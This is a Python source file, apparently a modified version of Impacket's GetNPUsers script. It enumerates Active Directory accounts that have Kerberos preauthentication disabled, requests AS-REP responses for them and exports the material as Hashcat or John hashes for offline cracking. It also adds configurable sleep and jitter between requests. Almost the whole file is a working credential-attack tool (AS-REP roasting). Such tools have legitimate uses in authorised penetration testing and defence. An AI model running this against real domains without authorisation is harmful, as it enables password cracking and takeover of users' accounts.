#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See LICENSE
# for more information.
#
# Description:
#   Enumerate accounts without Kerberos preauthentication and export AS-REP
#   material in Hashcat or John format.
#
#   Original credit for this technique goes to @harmj0y:
#   https://blog.harmj0y.net/activedirectory/roasting-as-reps/
#   Related work by Geoff Janjua:
#   https://www.exumbraops.com/layerone2016/party
#
# Author:
#   Alberto Solino (@agsolino)
#

import argparse
import datetime
import logging
import os
import random
import sys
from binascii import hexlify
from time import sleep

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
from impacket.examples import logger
from impacket.examples.utils import parse_identity, ldap_login
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import KerberosError
from orpheus_kerberos import send_receive, validate_key_material
from orpheus_runtime import (
    ResultWriter, RunSummary, bounded_delay, load_usernames,
    normalize_kdc_options,
)
from impacket.krb5.types import KerberosTime, Principal
from impacket.ldap import ldap, ldapasn1


class GetUserNoPreAuth:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        for row in items:
            print(outputFormat.format(*row))

    def __init__(self, username, password, domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__target = None
        self.__lmhash = ''
        self.__nthash = ''
        self.__no_pass = cmdLineOptions.no_pass
        self.__outputFileName = cmdLineOptions.outputfile
        self.__outputFormat = cmdLineOptions.format
        self.__usersFile = cmdLineOptions.usersfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGT = cmdLineOptions.request
        self.__kdcIP = cmdLineOptions.dc_ip
        self.__kdcHost = cmdLineOptions.dc_host
        self.__options = cmdLineOptions.options
        self.__encryption = cmdLineOptions.encryption
        self.__overwrite = getattr(cmdLineOptions, 'overwrite', False)
        try:
            self.__sleep = int(cmdLineOptions.sleep)
        except:
            print("Invalid sleep integer value.")
            self.__sleep = 0
        try:
            self.__jitter = int(cmdLineOptions.jitter)
        except:
            print("Invalid jitter integer value.")
            self.__jitter = 0
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        self.baseDN = ','.join('dc=%s' % part for part in self.__domain.split('.'))

    def haveARest(self):
        if self.__sleep > 0:
            restFor = bounded_delay(self.__sleep, self.__jitter)
            print("Waiting " + str(restFor) + " seconds until next AS-REQ.")
            sleep(restFor)

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self, userName, requestPAC=True):

        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()

        domain = self.__domain.upper()
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        kdcopt = self.__options if self.__options else "0x40810010"
        _, option_indexes = normalize_kdc_options(kdcopt)
        opts = []
        for idx in option_indexes:
            print("Adding " + constants.KDCOptions(idx).name)
            opts.append(constants.KDCOptions(idx).value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            raise Exception('Empty Domain not allowed in Kerberos')

        reqBody['realm'] = domain

        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        print("Setting encryption to eType " + str(self.__encryption))
        supportedCiphers = (int(self.__encryption),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = send_receive(message, domain, self.__kdcIP)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # Retry with AES256/AES128 when the KDC rejects the requested etype.
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = send_receive(message, domain, self.__kdcIP)
            else:
                raise e

        # An AS-REP is expected only for accounts without preauthentication.
        try:
            decoder.decode(r, asn1Spec=KRB_ERROR())
        except:
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)

        if self.__outputFormat == 'john':
            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
                return '$krb5asrep$%d$%s%s$%s$%s' % (asRep['enc-part']['etype'], domain, clientName,
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode(),
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode())
            else:
                return '$krb5asrep$%s@%s:%s$%s' % (clientName, domain,
                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
        
        else:
            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
                return '$krb5asrep$%d$%s$%s$%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode(),
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode())
            else:
                return '$krb5asrep$%d$%s@%s:%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())

    @staticmethod
    def outputTGT(entry, fd=None):
        print(entry)
        if fd is not None:
            fd.write(entry + '\n')

    def run(self):
        if self.__usersFile:
            return self.request_users_file_TGTs()

        if self.__doKerberos is False and self.__no_pass is True:
            logging.info('Getting TGT for %s' % self.__username)
            return self.request_multiple_TGTs([self.__username])

        try:
            ldapConnection = ldap_login(self.__target, self.baseDN, self.__kdcIP, self.__kdcHost, self.__doKerberos, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
            # ldap_login may resolve a different destination hostname.
            self.__target = ldapConnection._dstHost
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') < 0:
                # LDAP authentication can fail for an account still roastable via AS-REQ.
                logging.info('Cannot authenticate %s, getting its TGT' % self.__username)
                return self.request_multiple_TGTs([self.__username])

        searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
                       (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)

        try:
            logging.debug('Search Filter=%s' % searchFilter)
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=999)
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # Keep partial results; this search does not use paging.
                resp = e.getAnswers()
            else:
                if str(e).find('NTLMAuthNegotiate') >= 0:
                    logging.critical("NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos "
                                     "authentication instead.")
                else:
                    if self.__kdcIP is not None and self.__kdcHost is not None:
                        logging.critical("If the credentials are valid, check the hostname and IP address of KDC. They "
                                         "must match exactly each other")
                raise

        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = "0x%x" % int(attribute['vals'][0])
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                if mustCommit is True:
                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
            except Exception as e:
                logging.debug("Exception:", exc_info=True)
                logging.error('Skipping item, cannot process due to error %s' % str(e))

        if len(answers)>0:
            self.printTable(answers, header=[ "Name", "MemberOf", "PasswordLastSet", "LastLogon", "UAC"])
            print('\n\n')

            if self.__requestTGT is True:
                usernames = [answer[0] for answer in answers]
                return self.request_multiple_TGTs(usernames)

        else:
            print("No entries found!")
        return RunSummary()

    def request_users_file_TGTs(self):
        return self.request_multiple_TGTs(load_usernames(self.__usersFile))

    def request_multiple_TGTs(self, usernames):
        summary = RunSummary()
        with ResultWriter(self.__outputFileName, self.__overwrite) as writer:
            for i, username in enumerate(usernames):
                if i:
                    self.haveARest()
                summary.attempted += 1
                try:
                    entry = self.getTGT(username)
                    self.outputTGT(entry, writer if self.__outputFileName is not None else None)
                    summary.succeeded += 1
                except Exception as e:
                    summary.failed += 1
                    logging.error('%s' % str(e))
        return summary



def build_parser():
    parser = argparse.ArgumentParser(
        add_help=True,
        description="Queries target domain for users with 'Do not require Kerberos preauthentication' set and exports their TGTs",
        epilog=(
            'For cache-only Kerberos authentication use -k -no-pass. '
            'KDC options accept a decimal or 0x-prefixed unsigned 32-bit integer. '
            'Sleep and jitter are applied between consecutive AS-REQ attempts.'
        ),
    )
    parser.add_argument('target', help='[[domain/]username[:password]]')
    parser.add_argument('-request', action='store_true', default=False, help='Request AS-REP material for matching accounts.')
    parser.add_argument('-outputfile', help='Write formatted AS-REP hashes atomically; implies -request.')
    parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat', help='Output format (default: hashcat).')
    parser.add_argument('-usersfile', help='Request one AS-REP for each non-empty unique username in this file.')
    parser.add_argument('-ts', action='store_true', help='Add timestamps to log messages.')
    parser.add_argument('-debug', action='store_true', help='Enable debug logging.')
    auth = parser.add_argument_group('authentication')
    auth.add_argument('-hashes', metavar='LMHASH:NTHASH', help='Authenticate LDAP with 128-bit hexadecimal LM/NT hashes.')
    auth.add_argument('-no-pass', action='store_true', help='Do not prompt for a password; combine with -k for cache-only authentication.')
    auth.add_argument('-k', action='store_true', help='Use Kerberos authentication. Cache-only usage requires -k -no-pass.')
    auth.add_argument('-aesKey', metavar='hex key', help='Authenticate with a 128-bit or 256-bit hexadecimal AES key; enables -k.')
    orph = parser.add_argument_group('orpheus')
    orph.add_argument('-options', default='0x40810010', help='KDC options as decimal or 0x-prefixed unsigned 32-bit integer.')
    orph.add_argument('-encryption', choices=['18', '23'], default='18', help='Requested AS-REP etype: 18=AES-256, 23=RC4.')
    orph.add_argument('-sleep', type=int, default=0, help='Base seconds to wait between consecutive attempts.')
    orph.add_argument('-jitter', type=int, default=0, help='Nonnegative +/- jitter applied to sleep.')
    orph.add_argument('-overwrite', action='store_true', help='Replace an existing output file atomically.')
    connection = parser.add_argument_group('connection')
    connection.add_argument('-dc-ip', help='Domain Controller IP used for LDAP and Kerberos connections.')
    connection.add_argument('-dc-host', help='Domain Controller hostname required by some Kerberos LDAP flows.')
    return parser


def main(argv=None):
    parser = build_parser()
    args = list(sys.argv[1:] if argv is None else argv)
    if not args:
        parser.print_help()
        return 2
    options = parser.parse_args(args)
    logger.init(options.ts, options.debug)
    if options.sleep < 0 or options.jitter < 0:
        logging.error('sleep and jitter must be nonnegative')
        return 2
    try:
        options.options, _ = normalize_kdc_options(options.options)
    except ValueError as exc:
        logging.error(str(exc))
        return 2
    try:
        validate_key_material(options.hashes, options.aesKey)
    except ValueError as exc:
        logging.error(str(exc))
        return 2
    if options.usersfile and not os.path.isfile(options.usersfile):
        logging.error('users file not found or unreadable: %s', options.usersfile)
        return 2
    if options.outputfile is not None:
        options.request = True
        if os.path.exists(options.outputfile) and not options.overwrite:
            logging.error('output already exists: %s', options.outputfile)
            return 2
    domain, username, password, _, _, options.k = parse_identity(
        options.target, options.hashes, options.no_pass, options.aesKey, options.k
    )
    if not domain:
        logging.critical('Domain should be specified!')
        return 2
    if not options.k and options.no_pass and not username and options.usersfile is None:
        logging.critical('A username or users file is required with -no-pass')
        return 2
    try:
        summary = GetUserNoPreAuth(username, password, domain, options).run()
    except (FileExistsError, FileNotFoundError, ValueError) as exc:
        logging.error(str(exc))
        return 2
    except (ConnectionError, OSError) as exc:
        logging.error(str(exc))
        return 4
    except (KerberosError, ldap.LDAPSessionError) as exc:
        logging.error(str(exc))
        return 3
    except Exception as exc:
        logging.debug('Exception:', exc_info=True)
        logging.error(str(exc))
        return 4
    if summary is None:
        return 0
    return int(summary.exit_code(enumeration_only=not options.request))


if __name__ == '__main__':
    print(version.BANNER)
    sys.exit(main())
